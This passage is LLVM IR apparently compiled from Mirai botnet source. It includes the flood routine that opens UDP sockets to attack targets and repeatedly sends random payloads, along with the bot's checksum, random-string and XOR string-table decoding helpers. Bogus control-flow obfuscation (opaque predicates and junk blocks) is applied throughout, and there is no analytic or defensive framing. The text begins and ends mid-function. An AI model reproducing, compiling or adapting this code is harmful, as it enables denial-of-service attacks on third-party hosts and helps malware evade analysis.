  store i32 0, i32* %11, align 4
  br label %279

; <label>:279:                                    ; preds = %originalBBpart233, %278
  %280 = load i32, i32* @x.37
  %281 = load i32, i32* @y.38
  %282 = sub i32 %280, 1
  %283 = mul i32 %280, %282
  %284 = urem i32 %283, 2
  %285 = icmp eq i32 %284, 0
  %286 = icmp slt i32 %281, 10
  %287 = or i1 %285, %286
  br i1 %287, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %279
  %288 = load i32, i32* %11, align 4
  %289 = load i8, i8* %7, align 1
  %290 = zext i8 %289 to i32
  %291 = icmp slt i32 %288, %290
  %292 = load i32, i32* @x.37
  %293 = load i32, i32* @y.38
  %294 = sub i32 %292, 1
  %295 = mul i32 %292, %294
  %296 = urem i32 %295, 2
  %297 = icmp eq i32 %296, 0
  %298 = icmp slt i32 %293, 10
  %299 = or i1 %297, %298
  br i1 %299, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br i1 %291, label %300, label %345

; <label>:300:                                    ; preds = %originalBBpart224
  %301 = load i8**, i8*** %12, align 8
  %302 = load i32, i32* %11, align 4
  %303 = sext i32 %302 to i64
  %304 = getelementptr inbounds i8*, i8** %301, i64 %303
  %305 = load i8*, i8** %304, align 8
  store i8* %305, i8** %25, align 8
  %306 = load i8, i8* %17, align 1
  %307 = icmp ne i8 %306, 0
  br i1 %307, label %308, label %316

; <label>:308:                                    ; preds = %300
  %309 = load i8*, i8** %25, align 8
  %310 = load i16, i16* %16, align 2
  %311 = zext i16 %310 to i32
  call void @rand_alphastr(i8* %309, i32 %311)
  %312 = load i8*, i8** %25, align 8
  %313 = load i16, i16* %16, align 2
  %314 = zext i16 %313 to i64
  %315 = getelementptr inbounds i8, i8* %312, i64 %314
  store i8 0, i8* %315, align 1
  br label %316

; <label>:316:                                    ; preds = %308, %300
  %317 = load i32*, i32** %13, align 8
  %318 = load i32, i32* %11, align 4
  %319 = sext i32 %318 to i64
  %320 = getelementptr inbounds i32, i32* %317, i64 %319
  %321 = load i32, i32* %320, align 4
  %322 = load i8*, i8** %25, align 8
  %323 = load i16, i16* %16, align 2
  %324 = zext i16 %323 to i64
  %325 = call i64 @send(i32 %321, i8* %322, i64 %324, i32 16384)
  br label %326

; <label>:326:                                    ; preds = %316
  %327 = load i32, i32* @x.37
  %328 = load i32, i32* @y.38
  %329 = sub i32 %327, 1
  %330 = mul i32 %327, %329
  %331 = urem i32 %330, 2
  %332 = icmp eq i32 %331, 0
  %333 = icmp slt i32 %328, 10
  %334 = or i1 %332, %333
  br i1 %334, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %326
  %335 = load i32, i32* %11, align 4
  %336 = add nsw i32 %335, 1
  store i32 %336, i32* %11, align 4
  %337 = load i32, i32* @x.37
  %338 = load i32, i32* @y.38
  %339 = sub i32 %337, 1
  %340 = mul i32 %337, %339
  %341 = urem i32 %340, 2
  %342 = icmp eq i32 %341, 0
  %343 = icmp slt i32 %338, 10
  %344 = or i1 %342, %343
  br i1 %344, label %originalBBpart233, label %originalBB26alteredBB

originalBBpart233:                                ; preds = %originalBB26
  br label %279

; <label>:345:                                    ; preds = %originalBBpart224
  %346 = call i64 @time(i64* null) #6
  %347 = load i32, i32* %19, align 4
  %348 = sext i32 %347 to i64
  %349 = icmp sgt i64 %346, %348
  br i1 %349, label %350, label %351

; <label>:350:                                    ; preds = %345
  br label %368

; <label>:351:                                    ; preds = %345
  %352 = load i32, i32* @x.37
  %353 = load i32, i32* @y.38
  %354 = sub i32 %352, 1
  %355 = mul i32 %352, %354
  %356 = urem i32 %355, 2
  %357 = icmp eq i32 %356, 0
  %358 = icmp slt i32 %353, 10
  %359 = or i1 %357, %358
  br i1 %359, label %originalBB35, label %originalBB35alteredBB

originalBB35:                                     ; preds = %originalBB35alteredBB, %351
  %360 = load i32, i32* @x.37
  %361 = load i32, i32* @y.38
  %362 = sub i32 %360, 1
  %363 = mul i32 %360, %362
  %364 = urem i32 %363, 2
  %365 = icmp eq i32 %364, 0
  %366 = icmp slt i32 %361, 10
  %367 = or i1 %365, %366
  br i1 %367, label %originalBBpart237, label %originalBB35alteredBB

originalBBpart237:                                ; preds = %originalBB35
  br label %278

; <label>:368:                                    ; preds = %350, %originalBBpart212
  %369 = load i32, i32* @x.37
  %370 = load i32, i32* @y.38
  %371 = sub i32 %369, 1
  %372 = mul i32 %369, %371
  %373 = urem i32 %372, 2
  %374 = icmp eq i32 %373, 0
  %375 = icmp slt i32 %370, 10
  %376 = or i1 %374, %375
  br i1 %376, label %originalBB39, label %originalBB39alteredBB

originalBB39:                                     ; preds = %originalBB39alteredBB, %368
  %377 = load i32, i32* @x.37
  %378 = load i32, i32* @y.38
  %379 = sub i32 %377, 1
  %380 = mul i32 %377, %379
  %381 = urem i32 %380, 2
  %382 = icmp eq i32 %381, 0
  %383 = icmp slt i32 %378, 10
  %384 = or i1 %382, %383
  br i1 %384, label %originalBBpart241, label %originalBB39alteredBB

originalBBpart241:                                ; preds = %originalBB39
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %59
  %385 = call i32 @rand_next()
  %386 = trunc i32 %385 to i16
  store i16 %386, i16* %15, align 2
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %82
  %387 = load i32, i32* %11, align 4
  %388 = load i8, i8* %7, align 1
  %389 = zext i8 %388 to i32
  %390 = icmp slt i32 %387, %389
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %130
  %391 = call i32 @socket(i32 2, i32 2, i32 17) #6
  %392 = load i32*, i32** %13, align 8
  %393 = load i32, i32* %11, align 4
  %394 = sext i32 %393 to i64
  %395 = getelementptr inbounds i32, i32* %392, i64 %394
  store i32 %391, i32* %395, align 4
  %396 = icmp eq i32 %391, -1
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %153
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %223
  %397 = load i32*, i32** %13, align 8
  %398 = load i32, i32* %11, align 4
  %399 = sext i32 %398 to i64
  %400 = getelementptr inbounds i32, i32* %397, i64 %399
  %401 = load i32, i32* %400, align 4
  %402 = bitcast %union.__CONST_SOCKADDR_ARG* %24 to %struct.sockaddr**
  %403 = load %struct.attack_target*, %struct.attack_target** %8, align 8
  %404 = load i32, i32* %11, align 4
  %405 = sext i32 %404 to i64
  %406 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %403, i64 %405
  %407 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %406, i32 0, i32 0
  %408 = bitcast %struct.sockaddr_in* %407 to %struct.sockaddr*
  store %struct.sockaddr* %408, %struct.sockaddr** %402, align 8
  %409 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %24, i32 0, i32 0
  %410 = load %struct.sockaddr*, %struct.sockaddr** %409, align 8
  %411 = call i32 @connect(i32 %401, %struct.sockaddr* %410, i32 16)
  %412 = icmp eq i32 %411, -1
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %261
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %279
  %413 = load i32, i32* %11, align 4
  %414 = load i8, i8* %7, align 1
  %415 = zext i8 %414 to i32
  %416 = icmp slt i32 %413, %415
  br label %originalBB22

originalBB26alteredBB:                            ; preds = %originalBB26, %326
  %417 = load i32, i32* %11, align 4
  %_ = sub i32 0, %417
  %gen = add i32 %_, 1
  %_27 = sub i32 0, %417
  %gen28 = add i32 %_27, 1
  %_29 = sub i32 0, %417
  %gen30 = add i32 %_29, 1
  %_31 = shl i32 %417, 1
  %418 = add nsw i32 %417, 1
  store i32 %418, i32* %11, align 4
  br label %originalBB26

originalBB35alteredBB:                            ; preds = %originalBB35, %351
  br label %originalBB35

originalBB39alteredBB:                            ; preds = %originalBB39, %368
  br label %originalBB39
}

; Function Attrs: nounwind
declare i32 @bind(i32, %struct.sockaddr*, i32) #1

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @checksum_generic(i16*, i32) #0 {
  %3 = alloca i16*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  store i16* %0, i16** %3, align 8
  store i32 %1, i32* %4, align 4
  store i64 0, i64* %5, align 8
  store i64 0, i64* %5, align 8
  br label %6

; <label>:6:                                      ; preds = %16, %2
  %7 = load i32, i32* %4, align 4
  %8 = icmp ugt i32 %7, 1
  br i1 %8, label %9, label %19

; <label>:9:                                      ; preds = %6
  %10 = load i16*, i16** %3, align 8
  %11 = getelementptr inbounds i16, i16* %10, i32 1
  store i16* %11, i16** %3, align 8
  %12 = load i16, i16* %10, align 2
  %13 = zext i16 %12 to i64
  %14 = load i64, i64* %5, align 8
  %15 = add i64 %14, %13
  store i64 %15, i64* %5, align 8
  br label %16

; <label>:16:                                     ; preds = %9
  %17 = load i32, i32* %4, align 4
  %18 = sub i32 %17, 2
  store i32 %18, i32* %4, align 4
  br label %6

; <label>:19:                                     ; preds = %6
  %20 = load i32, i32* %4, align 4
  %21 = icmp eq i32 %20, 1
  br i1 %21, label %22, label %29

; <label>:22:                                     ; preds = %19
  %23 = load i16*, i16** %3, align 8
  %24 = load i16, i16* %23, align 2
  %25 = trunc i16 %24 to i8
  %26 = sext i8 %25 to i64
  %27 = load i64, i64* %5, align 8
  %28 = add i64 %27, %26
  store i64 %28, i64* %5, align 8
  br label %29

; <label>:29:                                     ; preds = %22, %19
  %30 = load i64, i64* %5, align 8
  %31 = lshr i64 %30, 16
  %32 = load i64, i64* %5, align 8
  %33 = and i64 %32, 65535
  %34 = add i64 %31, %33
  store i64 %34, i64* %5, align 8
  %35 = load i64, i64* %5, align 8
  %36 = lshr i64 %35, 16
  %37 = load i64, i64* %5, align 8
  %38 = add i64 %37, %36
  store i64 %38, i64* %5, align 8
  %39 = load i64, i64* %5, align 8
  %40 = xor i64 %39, -1
  %41 = trunc i64 %40 to i16
  ret i16 %41
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @checksum_tcpudp(%struct.iphdr*, i8*, i16 zeroext, i32) #0 {
  %5 = alloca %struct.iphdr*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i16, align 2
  %8 = alloca i32, align 4
  %9 = alloca i16*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  store %struct.iphdr* %0, %struct.iphdr** %5, align 8
  store i8* %1, i8** %6, align 8
  store i16 %2, i16* %7, align 2
  store i32 %3, i32* %8, align 4
  %14 = load i8*, i8** %6, align 8
  %15 = bitcast i8* %14 to i16*
  store i16* %15, i16** %9, align 8
  %16 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %17 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %16, i32 0, i32 8
  %18 = load i32, i32* %17, align 4
  store i32 %18, i32* %10, align 4
  %19 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %20 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %19, i32 0, i32 9
  %21 = load i32, i32* %20, align 4
  store i32 %21, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %22 = load i32, i32* %8, align 4
  store i32 %22, i32* %13, align 4
  br label %23

; <label>:23:                                     ; preds = %26, %4
  %24 = load i32, i32* %8, align 4
  %25 = icmp sgt i32 %24, 1
  br i1 %25, label %26, label %36

; <label>:26:                                     ; preds = %23
  %27 = load i16*, i16** %9, align 8
  %28 = load i16, i16* %27, align 2
  %29 = zext i16 %28 to i32
  %30 = load i32, i32* %12, align 4
  %31 = add i32 %30, %29
  store i32 %31, i32* %12, align 4
  %32 = load i16*, i16** %9, align 8
  %33 = getelementptr inbounds i16, i16* %32, i32 1
  store i16* %33, i16** %9, align 8
  %34 = load i32, i32* %8, align 4
  %35 = sub nsw i32 %34, 2
  store i32 %35, i32* %8, align 4
  br label %23

; <label>:36:                                     ; preds = %23
  %37 = load i32, i32* %8, align 4
  %38 = icmp eq i32 %37, 1
  br i1 %38, label %39, label %62

; <label>:39:                                     ; preds = %36
  %40 = load i32, i32* @x.41
  %41 = load i32, i32* @y.42
  %42 = sub i32 %40, 1
  %43 = mul i32 %40, %42
  %44 = urem i32 %43, 2
  %45 = icmp eq i32 %44, 0
  %46 = icmp slt i32 %41, 10
  %47 = or i1 %45, %46
  br i1 %47, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %39
  %48 = load i16*, i16** %9, align 8
  %49 = bitcast i16* %48 to i8*
  %50 = load i8, i8* %49, align 1
  %51 = zext i8 %50 to i32
  %52 = load i32, i32* %12, align 4
  %53 = add i32 %52, %51
  store i32 %53, i32* %12, align 4
  %54 = load i32, i32* @x.41
  %55 = load i32, i32* @y.42
  %56 = sub i32 %54, 1
  %57 = mul i32 %54, %56
  %58 = urem i32 %57, 2
  %59 = icmp eq i32 %58, 0
  %60 = icmp slt i32 %55, 10
  %61 = or i1 %59, %60
  br i1 %61, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %62

; <label>:62:                                     ; preds = %originalBBpart2, %36
  %63 = load i32, i32* %10, align 4
  %64 = lshr i32 %63, 16
  %65 = and i32 %64, 65535
  %66 = load i32, i32* %12, align 4
  %67 = add i32 %66, %65
  store i32 %67, i32* %12, align 4
  %68 = load i32, i32* %10, align 4
  %69 = and i32 %68, 65535
  %70 = load i32, i32* %12, align 4
  %71 = add i32 %70, %69
  store i32 %71, i32* %12, align 4
  %72 = load i32, i32* %11, align 4
  %73 = lshr i32 %72, 16
  %74 = and i32 %73, 65535
  %75 = load i32, i32* %12, align 4
  %76 = add i32 %75, %74
  store i32 %76, i32* %12, align 4
  %77 = load i32, i32* %11, align 4
  %78 = and i32 %77, 65535
  %79 = load i32, i32* %12, align 4
  %80 = add i32 %79, %78
  store i32 %80, i32* %12, align 4
  %81 = load %struct.iphdr*, %struct.iphdr** %5, align 8
  %82 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %81, i32 0, i32 6
  %83 = load i8, i8* %82, align 1
  %84 = zext i8 %83 to i16
  %85 = call zeroext i16 @htons(i16 zeroext %84) #7
  %86 = zext i16 %85 to i32
  %87 = load i32, i32* %12, align 4
  %88 = add i32 %87, %86
  store i32 %88, i32* %12, align 4
  %89 = load i16, i16* %7, align 2
  %90 = zext i16 %89 to i32
  %91 = load i32, i32* %12, align 4
  %92 = add i32 %91, %90
  store i32 %92, i32* %12, align 4
  br label %93

; <label>:93:                                     ; preds = %originalBBpart240, %62
  %94 = load i32, i32* @x.41
  %95 = load i32, i32* @y.42
  %96 = sub i32 %94, 1
  %97 = mul i32 %94, %96
  %98 = urem i32 %97, 2
  %99 = icmp eq i32 %98, 0
  %100 = icmp slt i32 %95, 10
  %101 = or i1 %99, %100
  br i1 %101, label %originalBB8, label %originalBB8alteredBB

originalBB8:                                      ; preds = %originalBB8alteredBB, %93
  %102 = load i32, i32* %12, align 4
  %103 = lshr i32 %102, 16
  %104 = icmp ne i32 %103, 0
  %105 = load i32, i32* @x.41
  %106 = load i32, i32* @y.42
  %107 = sub i32 %105, 1
  %108 = mul i32 %105, %107
  %109 = urem i32 %108, 2
  %110 = icmp eq i32 %109, 0
  %111 = icmp slt i32 %106, 10
  %112 = or i1 %110, %111
  br i1 %112, label %originalBBpart218, label %originalBB8alteredBB

originalBBpart218:                                ; preds = %originalBB8
  br i1 %104, label %113, label %135

; <label>:113:                                    ; preds = %originalBBpart218
  %114 = load i32, i32* @x.41
  %115 = load i32, i32* @y.42
  %116 = sub i32 %114, 1
  %117 = mul i32 %114, %116
  %118 = urem i32 %117, 2
  %119 = icmp eq i32 %118, 0
  %120 = icmp slt i32 %115, 10
  %121 = or i1 %119, %120
  br i1 %121, label %originalBB20, label %originalBB20alteredBB

originalBB20:                                     ; preds = %originalBB20alteredBB, %113
  %122 = load i32, i32* %12, align 4
  %123 = and i32 %122, 65535
  %124 = load i32, i32* %12, align 4
  %125 = lshr i32 %124, 16
  %126 = add i32 %123, %125
  store i32 %126, i32* %12, align 4
  %127 = load i32, i32* @x.41
  %128 = load i32, i32* @y.42
  %129 = sub i32 %127, 1
  %130 = mul i32 %127, %129
  %131 = urem i32 %130, 2
  %132 = icmp eq i32 %131, 0
  %133 = icmp slt i32 %128, 10
  %134 = or i1 %132, %133
  br i1 %134, label %originalBBpart240, label %originalBB20alteredBB

originalBBpart240:                                ; preds = %originalBB20
  br label %93

; <label>:135:                                    ; preds = %originalBBpart218
  %136 = load i32, i32* @x.41
  %137 = load i32, i32* @y.42
  %138 = sub i32 %136, 1
  %139 = mul i32 %136, %138
  %140 = urem i32 %139, 2
  %141 = icmp eq i32 %140, 0
  %142 = icmp slt i32 %137, 10
  %143 = or i1 %141, %142
  br i1 %143, label %originalBB42, label %originalBB42alteredBB

originalBB42:                                     ; preds = %originalBB42alteredBB, %135
  %144 = load i32, i32* %12, align 4
  %145 = xor i32 %144, -1
  %146 = trunc i32 %145 to i16
  %147 = load i32, i32* @x.41
  %148 = load i32, i32* @y.42
  %149 = sub i32 %147, 1
  %150 = mul i32 %147, %149
  %151 = urem i32 %150, 2
  %152 = icmp eq i32 %151, 0
  %153 = icmp slt i32 %148, 10
  %154 = or i1 %152, %153
  br i1 %154, label %originalBBpart251, label %originalBB42alteredBB

originalBBpart251:                                ; preds = %originalBB42
  ret i16 %146

originalBBalteredBB:                              ; preds = %originalBB, %39
  %155 = load i16*, i16** %9, align 8
  %156 = bitcast i16* %155 to i8*
  %157 = load i8, i8* %156, align 1
  %158 = zext i8 %157 to i32
  %159 = load i32, i32* %12, align 4
  %_ = sub i32 %159, %158
  %gen = mul i32 %_, %158
  %_1 = sub i32 %159, %158
  %gen2 = mul i32 %_1, %158
  %_3 = shl i32 %159, %158
  %_4 = sub i32 0, %159
  %gen5 = add i32 %_4, %158
  %_6 = sub i32 %159, %158
  %gen7 = mul i32 %_6, %158
  %160 = add i32 %159, %158
  store i32 %160, i32* %12, align 4
  br label %originalBB

originalBB8alteredBB:                             ; preds = %originalBB8, %93
  %161 = load i32, i32* %12, align 4
  %_9 = sub i32 0, %161
  %gen10 = add i32 %_9, 16
  %_11 = sub i32 %161, 16
  %gen12 = mul i32 %_11, 16
  %_13 = sub i32 0, %161
  %gen14 = add i32 %_13, 16
  %_15 = sub i32 0, %161
  %gen16 = add i32 %_15, 16
  %162 = lshr i32 %161, 16
  %163 = icmp ne i32 %162, 0
  br label %originalBB8

originalBB20alteredBB:                            ; preds = %originalBB20, %113
  %164 = load i32, i32* %12, align 4
  %_21 = sub i32 0, %164
  %gen22 = add i32 %_21, 65535
  %_23 = sub i32 0, %164
  %gen24 = add i32 %_23, 65535
  %_25 = sub i32 0, %164
  %gen26 = add i32 %_25, 65535
  %_27 = sub i32 %164, 65535
  %gen28 = mul i32 %_27, 65535
  %_29 = sub i32 0, %164
  %gen30 = add i32 %_29, 65535
  %_31 = shl i32 %164, 65535
  %165 = and i32 %164, 65535
  %166 = load i32, i32* %12, align 4
  %_32 = sub i32 %166, 16
  %gen33 = mul i32 %_32, 16
  %167 = lshr i32 %166, 16
  %_34 = shl i32 %165, %167
  %_35 = shl i32 %165, %167
  %_36 = shl i32 %165, %167
  %_37 = sub i32 0, %165
  %gen38 = add i32 %_37, %167
  %168 = add i32 %165, %167
  store i32 %168, i32* %12, align 4
  br label %originalBB20

originalBB42alteredBB:                            ; preds = %originalBB42, %135
  %169 = load i32, i32* %12, align 4
  %_43 = sub i32 0, %169
  %gen44 = add i32 %_43, -1
  %_45 = sub i32 0, %169
  %gen46 = add i32 %_45, -1
  %_47 = shl i32 %169, -1
  %_48 = sub i32 0, %169
  %gen49 = add i32 %_48, -1
  %170 = xor i32 %169, -1
  %171 = trunc i32 %170 to i16
  br label %originalBB42
}

; Function Attrs: noinline nounwind uwtable
define i32 @rand_next() #0 {
  %1 = alloca i32, align 4
  %2 = load i32, i32* @x, align 4
  store i32 %2, i32* %1, align 4
  %3 = load i32, i32* %1, align 4
  %4 = shl i32 %3, 11
  %5 = load i32, i32* %1, align 4
  %6 = xor i32 %5, %4
  store i32 %6, i32* %1, align 4
  %7 = load i32, i32* %1, align 4
  %8 = lshr i32 %7, 8
  %9 = load i32, i32* %1, align 4
  %10 = xor i32 %9, %8
  store i32 %10, i32* %1, align 4
  %11 = load i32, i32* @y, align 4
  store i32 %11, i32* @x, align 4
  %12 = load i32, i32* @z, align 4
  store i32 %12, i32* @y, align 4
  %13 = load i32, i32* @w, align 4
  store i32 %13, i32* @z, align 4
  %14 = load i32, i32* @w, align 4
  %15 = lshr i32 %14, 19
  %16 = load i32, i32* @w, align 4
  %17 = xor i32 %16, %15
  store i32 %17, i32* @w, align 4
  %18 = load i32, i32* %1, align 4
  %19 = load i32, i32* @w, align 4
  %20 = xor i32 %19, %18
  store i32 %20, i32* @w, align 4
  %21 = load i32, i32* @w, align 4
  ret i32 %21
}

; Function Attrs: noinline nounwind uwtable
define void @rand_alphastr(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca [32 x i8], align 16
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  call void @table_unlock_val(i8 zeroext 61)
  %6 = getelementptr inbounds [32 x i8], [32 x i8]* %5, i32 0, i32 0
  %7 = call i8* @table_retrieve_val(i32 61, i32* null)
  %8 = call i8* @strcpy(i8* %6, i8* %7) #6
  br label %9

; <label>:9:                                      ; preds = %13, %2
  %10 = load i32, i32* %4, align 4
  %11 = add nsw i32 %10, -1
  store i32 %11, i32* %4, align 4
  %12 = icmp ne i32 %10, 0
  br i1 %12, label %13, label %23

; <label>:13:                                     ; preds = %9
  %14 = call i32 @rand_next()
  %15 = getelementptr inbounds [32 x i8], [32 x i8]* %5, i32 0, i32 0
  %16 = call i32 @util_strlen(i8* %15)
  %17 = urem i32 %14, %16
  %18 = zext i32 %17 to i64
  %19 = getelementptr inbounds [32 x i8], [32 x i8]* %5, i64 0, i64 %18
  %20 = load i8, i8* %19, align 1
  %21 = load i8*, i8** %3, align 8
  %22 = getelementptr inbounds i8, i8* %21, i32 1
  store i8* %22, i8** %3, align 8
  store i8 %20, i8* %21, align 1
  br label %9

; <label>:23:                                     ; preds = %9
  call void @table_lock_val(i8 zeroext 61)
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @table_unlock_val(i8 zeroext) #0 {
  %2 = alloca i8, align 1
  %3 = alloca %struct.table_value*, align 8
  store i8 %0, i8* %2, align 1
  %4 = load i8, i8* %2, align 1
  %5 = zext i8 %4 to i64
  %6 = getelementptr inbounds [63 x %struct.table_value], [63 x %struct.table_value]* @table, i64 0, i64 %5
  store %struct.table_value* %6, %struct.table_value** %3, align 8
  %7 = load i8, i8* %2, align 1
  call void @toggle_obf(i8 zeroext %7)
  ret void
}

; Function Attrs: noinline nounwind uwtable
define internal void @toggle_obf(i8 zeroext) #0 {
  %2 = alloca i8, align 1
  %3 = alloca i32, align 4
  %4 = alloca %struct.table_value*, align 8
  %5 = alloca i8, align 1
  %6 = alloca i8, align 1
  %7 = alloca i8, align 1
  %8 = alloca i8, align 1
  store i8 %0, i8* %2, align 1
  %9 = load i8, i8* %2, align 1
  %10 = zext i8 %9 to i64
  %11 = getelementptr inbounds [63 x %struct.table_value], [63 x %struct.table_value]* @table, i64 0, i64 %10
  store %struct.table_value* %11, %struct.table_value** %4, align 8
  %12 = load i32, i32* @table_key, align 4
  %13 = and i32 %12, 255
  %14 = trunc i32 %13 to i8
  store i8 %14, i8* %5, align 1
  %15 = load i32, i32* @table_key, align 4
  %16 = lshr i32 %15, 8
  %17 = and i32 %16, 255
  %18 = trunc i32 %17 to i8
  store i8 %18, i8* %6, align 1
  %19 = load i32, i32* @table_key, align 4
  %20 = lshr i32 %19, 16
  %21 = and i32 %20, 255
  %22 = trunc i32 %21 to i8
  store i8 %22, i8* %7, align 1
  %23 = load i32, i32* @table_key, align 4
  %24 = lshr i32 %23, 24
  %25 = and i32 %24, 255
  %26 = trunc i32 %25 to i8
  store i8 %26, i8* %8, align 1
  store i32 0, i32* %3, align 4
  br label %27

; <label>:27:                                     ; preds = %originalBBpart241, %1
  %28 = load i32, i32* %3, align 4
  %29 = load %struct.table_value*, %struct.table_value** %4, align 8
  %30 = getelementptr inbounds %struct.table_value, %struct.table_value* %29, i32 0, i32 1
  %31 = load i16, i16* %30, align 8
  %32 = zext i16 %31 to i32
  %33 = icmp slt i32 %28, %32
  br i1 %33, label %34, label %118

; <label>:34:                                     ; preds = %27
  %35 = load i32, i32* @x.49
  %36 = load i32, i32* @y.50
  %37 = sub i32 %35, 1
  %38 = mul i32 %35, %37
  %39 = urem i32 %38, 2
  %40 = icmp eq i32 %39, 0
  %41 = icmp slt i32 %36, 10
  %42 = or i1 %40, %41
  br i1 %42, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %34
  %43 = load i8, i8* %5, align 1
  %44 = zext i8 %43 to i32
  %45 = load %struct.table_value*, %struct.table_value** %4, align 8
  %46 = getelementptr inbounds %struct.table_value, %struct.table_value* %45, i32 0, i32 0
  %47 = load i8*, i8** %46, align 8
  %48 = load i32, i32* %3, align 4
  %49 = sext i32 %48 to i64
  %50 = getelementptr inbounds i8, i8* %47, i64 %49
  %51 = load i8, i8* %50, align 1
  %52 = sext i8 %51 to i32
  %53 = xor i32 %52, %44
  %54 = trunc i32 %53 to i8
  store i8 %54, i8* %50, align 1
  %55 = load i8, i8* %6, align 1
  %56 = zext i8 %55 to i32
  %57 = load %struct.table_value*, %struct.table_value** %4, align 8
  %58 = getelementptr inbounds %struct.table_value, %struct.table_value* %57, i32 0, i32 0
  %59 = load i8*, i8** %58, align 8
  %60 = load i32, i32* %3, align 4
  %61 = sext i32 %60 to i64
  %62 = getelementptr inbounds i8, i8* %59, i64 %61
  %63 = load i8, i8* %62, align 1
  %64 = sext i8 %63 to i32
  %65 = xor i32 %64, %56
  %66 = trunc i32 %65 to i8
  store i8 %66, i8* %62, align 1
  %67 = load i8, i8* %7, align 1
  %68 = zext i8 %67 to i32
  %69 = load %struct.table_value*, %struct.table_value** %4, align 8
  %70 = getelementptr inbounds %struct.table_value, %struct.table_value* %69, i32 0, i32 0
  %71 = load i8*, i8** %70, align 8
  %72 = load i32, i32* %3, align 4
  %73 = sext i32 %72 to i64
  %74 = getelementptr inbounds i8, i8* %71, i64 %73
  %75 = load i8, i8* %74, align 1
  %76 = sext i8 %75 to i32
  %77 = xor i32 %76, %68
  %78 = trunc i32 %77 to i8
  store i8 %78, i8* %74, align 1
  %79 = load i8, i8* %8, align 1
  %80 = zext i8 %79 to i32
  %81 = load %struct.table_value*, %struct.table_value** %4, align 8
  %82 = getelementptr inbounds %struct.table_value, %struct.table_value* %81, i32 0, i32 0
  %83 = load i8*, i8** %82, align 8
  %84 = load i32, i32* %3, align 4
  %85 = sext i32 %84 to i64
  %86 = getelementptr inbounds i8, i8* %83, i64 %85
  %87 = load i8, i8* %86, align 1
  %88 = sext i8 %87 to i32
  %89 = xor i32 %88, %80
  %90 = trunc i32 %89 to i8
  store i8 %90, i8* %86, align 1
  %91 = load i32, i32* @x.49
  %92 = load i32, i32* @y.50
  %93 = sub i32 %91, 1
  %94 = mul i32 %91, %93
  %95 = urem i32 %94, 2
  %96 = icmp eq i32 %95, 0
  %97 = icmp slt i32 %92, 10
  %98 = or i1 %96, %97
  br i1 %98, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %99

; <label>:99:                                     ; preds = %originalBBpart2
  %100 = load i32, i32* @x.49
  %101 = load i32, i32* @y.50
  %102 = sub i32 %100, 1
  %103 = mul i32 %100, %102
  %104 = urem i32 %103, 2
  %105 = icmp eq i32 %104, 0
  %106 = icmp slt i32 %101, 10
  %107 = or i1 %105, %106
  br i1 %107, label %originalBB25, label %originalBB25alteredBB

originalBB25:                                     ; preds = %originalBB25alteredBB, %99
  %108 = load i32, i32* %3, align 4
  %109 = add nsw i32 %108, 1
  store i32 %109, i32* %3, align 4
  %110 = load i32, i32* @x.49
  %111 = load i32, i32* @y.50
  %112 = sub i32 %110, 1
  %113 = mul i32 %110, %112
  %114 = urem i32 %113, 2
  %115 = icmp eq i32 %114, 0
  %116 = icmp slt i32 %111, 10
  %117 = or i1 %115, %116
  br i1 %117, label %originalBBpart241, label %originalBB25alteredBB

originalBBpart241:                                ; preds = %originalBB25
  br label %27

; <label>:118:                                    ; preds = %27
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %34
  %119 = load i8, i8* %5, align 1
  %120 = zext i8 %119 to i32
  %121 = load %struct.table_value*, %struct.table_value** %4, align 8
  %122 = getelementptr inbounds %struct.table_value, %struct.table_value* %121, i32 0, i32 0
  %123 = load i8*, i8** %122, align 8
  %124 = load i32, i32* %3, align 4
  %125 = sext i32 %124 to i64
  %126 = getelementptr inbounds i8, i8* %123, i64 %125
  %127 = load i8, i8* %126, align 1
  %128 = sext i8 %127 to i32
  %129 = xor i32 %128, %120
  %130 = trunc i32 %129 to i8
  store i8 %130, i8* %126, align 1
  %131 = load i8, i8* %6, align 1
  %132 = zext i8 %131 to i32
  %133 = load %struct.table_value*, %struct.table_value** %4, align 8
  %134 = getelementptr inbounds %struct.table_value, %struct.table_value* %133, i32 0, i32 0
  %135 = load i8*, i8** %134, align 8
  %136 = load i32, i32* %3, align 4
  %137 = sext i32 %136 to i64
  %138 = getelementptr inbounds i8, i8* %135, i64 %137
  %139 = load i8, i8* %138, align 1
  %140 = sext i8 %139 to i32
  %_ = sub i32 0, %140
  %gen = add i32 %_, %132
  %_1 = sub i32 %140, %132
